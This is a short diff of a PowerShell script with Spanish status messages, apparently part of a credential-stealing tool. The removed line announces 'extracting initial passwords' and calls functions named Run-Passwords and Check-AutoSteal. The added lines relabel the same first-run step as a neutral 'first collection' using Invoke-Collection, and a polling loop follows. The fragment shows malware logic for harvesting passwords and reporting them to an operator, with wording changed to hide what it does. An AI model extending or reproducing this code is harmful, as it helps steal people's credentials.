-if(-not $script:PwAutoDone){ Send-Message "Extrayendo passwords iniciales..."; Run-Passwords; $script:PwAutoDone=$true; Save-State; Check-AutoSteal }
+if(-not $script:PwAutoDone){
+    Send-Message "Primera recopilacion..."
+    Invoke-Collection
+    $script:PwAutoDone=$true; Save-State
+}
 
 $lastCheck=Get-Date
 while($true){
